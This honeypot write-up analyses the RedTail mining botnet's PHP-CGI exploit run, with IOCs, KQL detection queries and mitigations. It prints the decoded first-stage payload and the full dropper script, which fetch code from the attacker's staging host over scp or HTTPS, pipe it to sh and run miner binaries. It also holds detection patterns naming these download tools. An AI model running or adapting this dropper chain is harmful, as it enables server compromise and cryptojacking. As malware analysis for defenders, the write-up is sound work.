RedTail on a PHP Honeypot: One Bot, 49 Requests, and a Dropper That Ships Its Own SSH Key

Twelve IPs running the libredtail-http bot hit our PHP honeypot with the same 49-request run. We decode the PHP-CGI payload in full, including the embedded SSH key it uses to pull the next stage over scp, and walk through the dropper script and miner binary served by the staging host.

Key Sections: Summary · The 49-Request Run · Stage One in Full · Decoded and Explained · The Shorter Variant · The Dropper Script · The Miner Binary · Did Anything Run? · Packet Capture Note · IOCs · Detection (KQL) · Mitigation

Part of the PHP honeypot series. Data: nginx request log and Apache container log from vm-php-cve-lab, 22 October – 15 November 2026 (UTC). URLs are defanged. Nothing on this page was executed.

1. Summary

RedTail is a Monero-mining botnet that spreads by exploiting web servers. Its scanner announces itself with the User-Agent libredtail-http. Between 2026-10-23 14:21:13 and 2026-11-05 14:14:57 UTC, 12 IPs running that scanner sent 545 requests to the honeypot (521 of them carrying the User-Agent). Every full run was the same 49 requests in the same order.

What makes this one worth a post is the first-stage payload. Instead of the usual wget | sh, the early variant writes an SSH private key to disk and pulls the next stage from the attacker's server with scp, falling back to HTTPS only if that fails. HTTP egress filtering and proxy logs never see the download.

None of it worked here. The honeypot runs PHP as an Apache module on Linux, and every exploit in the run needs something else. Section 8 shows how we know.

The two opening requests have no User-Agent and nginx rejected them with 400 before logging a URI, because the traversal sequences are not a valid path. They are the Apache 2.4.49 / 2.4.50 traversal (/cgi-bin/.%2e/.%2e/…/bin/sh and the double-encoded %%32%65 form). The 37 PHPUnit requests all carry the body <?php echo(md5("Hello PHPUnit")); — a check, not a payload: the bot looks for the MD5 in the response and only then sends the real thing. The same is true of the ThinkPHP (md5("Hello")) and pearcmd (md5("hi")) requests. Only the PHP-CGI requests carry the dropper on first contact.

The 1,116-character base64 string decodes to this shell script. We removed the body of the private key; everything else is as sent (line breaks added after each ;):

-----END OPENSSH PRIVATE KEY-----' > key.ppk;

else (wget --no-check-certificate -qO- hxxps://217.60.102.5/sh || curl -sk hxxps://217.60.102.5/sh) | sh -s cve_2024_4577;

StepWhat it does
cd /tmp || cd /var/tmp || cd /dev/shmFind a directory the web server user can write to.
echo '-----BEGIN OPENSSH PRIVATE KEY…' > key.ppkWrite an ed25519 private key to disk. The name says PuTTY but the format is OpenSSH. The key's comment is dlr@sftp ("downloader").
echo 'StrictHostKeyChecking no…' > sshcfgA two-line SSH config so the client does not prompt about the unknown host key and does not write to known_hosts.
scp -s -F sshcfg -i key.ppk dlr@217.60.102.5:sh out_shLog in to the staging host as user dlr with that key and copy the file sh. -s forces the SFTP subsystem. This goes out on TCP 22, not 80 or 443.
sh out_sh cve_2024_4577Run the downloaded script. The argument is a campaign tag: it tells the operator which exploit landed.
else (wget … || curl …) | sh -s cve_2024_4577If scp failed (no client, port 22 blocked), fetch the same script over HTTPS with certificate checks off and pipe it to sh.
rm -rf sshcfg key.ppk out_shRemove the key, config and script.
echo(md5("Hello CVE-2024-4577"))Back in PHP: print a known hash so the scanner can tell from the response that the code ran.

The public half of the embedded key, which is safe to publish and useful for hunting (authorized_keys on a seized or sinkholed staging host, or the same key reused elsewhere):

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIO94S34m0hVkYFUhtWQe92S9Cp0yJp+7n8gw696Uf/LG dlr@sftp
SHA256:O/at8341SoPpKvTPvMsJSgjQm30md9VTS2it25sY0vg

Shipping a private key to every target means every victim, honeypot and researcher holds a login to the staging host's dlr account. The operator is betting that the account is locked down to read-only SFTP. We did not test that; logging in to someone else's server with a found key is unauthorised access.

6. The Dropper Script

The lab holds a copy of the sh script served by the staging host, saved on 23 October 2026 at 05:03 UTC. It is 2,312 bytes. In full (URLs defanged):

#!/bin/bash

get_random_string() {
  len=$(expr $(od -An -N2 -i /dev/urandom 2>/dev/null | tr -d ' ') % 32 + 4 2>/dev/null)

  if command -v openssl >/dev/null 2>&1; then
    str=$(openssl rand -base64 256 2>/dev/null | tr -dc 'A-Za-z0-9' | head -c "$len")
    if [ -n "$str" ]; then
      echo "$str"
      return 0
    fi
  fi

  if [ -r /dev/urandom ]; then
    str=$(tr -dc 'A-Za-z0-9' </dev/urandom 2>/dev/null | head -c "$len")
    if [ -n "$str" ]; then
      echo "$str"
      return 0
    fi
  fi

  if [ -n "$RANDOM" ]; then
    echo "$RANDOM"
    return 0
  fi

  # If all else fails
  echo "redtail"
  return 1
}

dlr() {
  rm -rf $1
  wget --no-check-certificate -q hxxps://217.60.102.5/$1 || curl -skO hxxps://217.60.102.5/$1
}

get_noexec_dirs() {
  if command -v findmnt >/dev/null 2>&1; then
    findmnt -rn -O noexec -o TARGET
  else
    cat /proc/mounts | grep 'noexec' | awk '{print $2}'
  fi
}

NOEXEC_DIRS=$(get_noexec_dirs)
EXCLUDE=""

for dir in $NOEXEC_DIRS; do
  EXCLUDE="${EXCLUDE} -not -path \"$dir\" -not -path \"$dir/*\""
done

FOLDERS=$(eval find / -type d -user $(whoami) -perm -u=rwx -not -path \"/tmp/*\" -not -path \"/proc/*\" $EXCLUDE 2>/dev/null)
ARCH=$(uname -mp)
OK=true
FILENAME=".$(get_random_string)"

for i in $FOLDERS /tmp /var/tmp /dev/shm; do
  if cd "$i" && touch .testfile && (dd if=/dev/zero of=.testfile2 bs=2M count=1 >/dev/null 2>&1 || truncate -s 2M .testfile2 >/dev/null 2>&1); then
    rm -rf .testfile .testfile2
    break
  fi
done

dlr clean
chmod +x clean
sh clean >/dev/null 2>&1
rm -rf clean

rm -rf .redtail
rm -rf $FILENAME

if echo "$ARCH" | grep -q "x86_64" || echo "$ARCH" | grep -q "amd64"; then
  dlr x86_64
  mv -f x86_64 $FILENAME
elif echo "$ARCH" | grep -q "i[3456]86"; then
  dlr i686
  mv -f i686 $FILENAME
elif echo "$ARCH" | grep -q "armv8" || echo "$ARCH" | grep -q "aarch64"; then
  dlr aarch64
  mv -f aarch64 $FILENAME
elif echo "$ARCH" | grep -q "armv7"; then
  dlr arm7
  mv -f arm7 $FILENAME
elif echo "$ARCH" | grep -q "riscv"; then
  dlr riscv
  mv -f riscv $FILENAME
else
  OK=false
  for a in x86_64 i686 aarch64 arm7 riscv; do
    dlr $a
    cat $a >$FILENAME
    chmod +x $FILENAME
    ./$FILENAME $1 >/dev/null 2>&1
    rm -rf $a
  done
fi

if [ $OK = true ]; then
  chmod +x $FILENAME
  ./$FILENAME $1 >/dev/null 2>&1
fi

What it does, in order:

  1. Picks a random hidden filename. get_random_string builds a 4–35 character name from OpenSSL or /dev/urandom and prefixes a dot. If every random source fails, it falls back to the literal name redtail, which is where the malware's name comes from.
  2. Finds somewhere it can execute. It lists noexec mounts, searches the whole filesystem for directories the current user owns with rwx, and takes the first one where it can create a 2 MB file. /tmp, /var/tmp and /dev/shm are the last resort, not the first.
  3. Runs clean. A second script from the same host, run and deleted. We do not have a copy of it.
  4. Removes the previous install (.redtail).
  5. Downloads the binary for the CPU: x86_64, i686, aarch64, arm7 or riscv. If the architecture is unknown it downloads and tries all five.
  6. Runs it with the campaign tag ($1, here cve_2024_4577) as the only argument.

There is no persistence in this script: no cron entry, no systemd unit, no authorized_keys edit. If the miner persists, the binary does it.

9. Packet Capture Note

The lab ran a rolling packet capture (tcpdump, full snap length, 20 files of 10 MB) on port 80 and the Docker bridges. A ring that small holds about a day and a half of traffic, and the last of it was overwritten on 15 November when the VM was restarted and a large package download passed through the capture filter. The packets for the requests in this post no longer exist. What remains is the nginx request log (request line, User-Agent, Content-Type and the complete request body) and the Apache log from inside the container, both shipped to Microsoft Sentinel as they were written. 11. Detection (KQL)

The honeypot's nginx log lands in Sentinel's Syslog table as JSON. The scanner and its payload:

Syslog
| where TimeGenerated > ago(7d)
| where SyslogMessage startswith "php_http: "
| extend j = parse_json(substring(SyslogMessage, 10))
| extend Client = tostring(j.client), Request = tostring(j.request), UA = tostring(j.user_agent), Body = tostring(j.body), Status = toint(j.status)
| where UA == "libredtail-http"
   or Request has_any ("auto_prepend_file", "allow_url_include")
   or Body has "shell_exec(base64_decode("
| summarize Requests = count(), Ok200 = countif(Status == 200), First = min(TimeGenerated), Last = max(TimeGenerated) by Client, UA
| order by First asc

On real servers, hunt for the behaviour after a hit: a web server process starting scp or ssh, or connecting to the staging host. With Defender for Endpoint on Linux:

DeviceProcessEvents
| where Timestamp > ago(7d)
| where InitiatingProcessParentFileName in~ ("apache2", "httpd", "nginx", "php-fpm", "php-cgi", "php")
     or InitiatingProcessFileName in~ ("apache2", "httpd", "php-fpm", "php-cgi", "php")
| where FileName in~ ("scp", "ssh", "sftp", "wget", "curl")
| where ProcessCommandLine has_any ("key.ppk", "sshcfg", "dlr@", "217.60.102.5", "--no-check-certificate")
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName

DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteIP == "217.60.102.5"
| project Timestamp, DeviceName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemotePort

12. Mitigation

  • Block outbound TCP 22 from web servers. A web tier has no reason to open SSH sessions to the internet, and this dropper's first choice depends on it.
  • Do not run PHP in CGI mode on Windows (XAMPP's default). If you must, be on PHP 8.3.8 / 8.2.20 / 8.1.29 or later.
  • Never deploy vendor/ with dev dependencies to a web root. composer install --no-dev, and deny /vendor/ at the web server.
  • Mount /tmp, /var/tmp and /dev/shm noexec, and make sure the web user owns no executable-capable directory outside them. The dropper checks for exactly this.
  • Alert on the User-Agent. It is free signal.
